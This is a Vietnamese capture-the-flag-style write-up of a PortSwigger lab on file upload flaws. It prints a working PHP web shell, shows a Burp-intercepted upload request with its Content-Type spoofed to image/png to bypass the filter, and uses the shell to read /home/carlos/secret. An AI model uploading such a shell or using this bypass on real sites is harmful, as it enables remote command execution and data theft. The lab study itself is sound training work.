<img width="994" height="594" alt="image" src="https://github.com/user-attachments/assets/649ec20b-1ee5-496a-8e4d-e20342cd84c8" />

# Tổng quan 

Đầu tiên ta đăng nhập với tài khoản `wiener` và mật khẩu `peter` được cấp từ trước 

Sau khi đăng nhập,ta thấy có chức năng Upload Avatar có khả năng là File Upload Vuln

Ta thử với exploit.php
```
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
```
<img width="1688" height="889" alt="image" src="https://github.com/user-attachments/assets/7630ad11-f4a6-47e7-98ed-d80f8fc2ff24" />

Ta thấy rằng Web trả về lỗi là file mà ta upload là application/octet-stream là bị banned 

Nhưng web vô tình gợi ý cho ta hướng khai thác ở câu `Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.`

Mục tiêu của lab là đọc được nội dung :/home/carlos/secret

# Khai Thác

Ta sử dụng Burp Suite bật Chromium,ta upload file exploit.php như bình thường nhưng trước khi click vào button Upload thì ta sẽ bật Intercept 

<img width="1676" height="917" alt="image" src="https://github.com/user-attachments/assets/4e4c6df4-ad39-4c3a-9ed7-0d6cc8d6ca1e" />

Bấm upload

Tiếp theo quay về Burp Intercept đọc request POST:
```
POST /my-account/avatar HTTP/2
Host: 0abf002703675c4f806ff832009c0012.web-security-academy.net
Cookie: session=9aYsa4tCvasPgoMUJxnzcGcRMGd40Olf
Content-Length: 791
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0abf002703675c4f806ff832009c0012.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWlYzGoGK2Ch4qhv6
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abf002703675c4f806ff832009c0012.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryWlYzGoGK2Ch4qhv6
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

GIF89a
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
------WebKitFormBoundaryWlYzGoGK2Ch4qhv6
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryWlYzGoGK2Ch4qhv6
Content-Disposition: form-data; name="csrf"

FfpM11PXd5rELRP1s0PZc6KkWP5rrU34
------WebKitFormBoundaryWlYzGoGK2Ch4qhv6--

```
Ta sửa value của Content-Type thành image/png rồi đẩy request đi

<img width="1705" height="924" alt="image" src="https://github.com/user-attachments/assets/43e49197-f188-4587-b4e3-7e482cf1b86a" />

=> Ta đã thành công upload file exploit.php

Tiếp theo ta truy cập file exploit.php theo path files/avatars/exploit.php

<img width="1706" height="970" alt="image" src="https://github.com/user-attachments/assets/503b28c3-59d1-4f5c-a630-32721ae8c535" />

Ta sử dụng Linux command sau để đọc nội dung của /home/carlos/secret:

```
cat /home/carlos/secret
```

<img width="1706" height="974" alt="image" src="https://github.com/user-attachments/assets/542339b6-304a-4d88-b9e8-1ef5b7545afb" />

Vậy nội dung ta cần submit là:O06ghd0eggmzwQVNqoi1C8UFsLVJ89TT 

<img width="1690" height="923" alt="image" src="https://github.com/user-attachments/assets/0eb846cd-0998-4135-8776-27a09b2433d3" />

=> Solved!
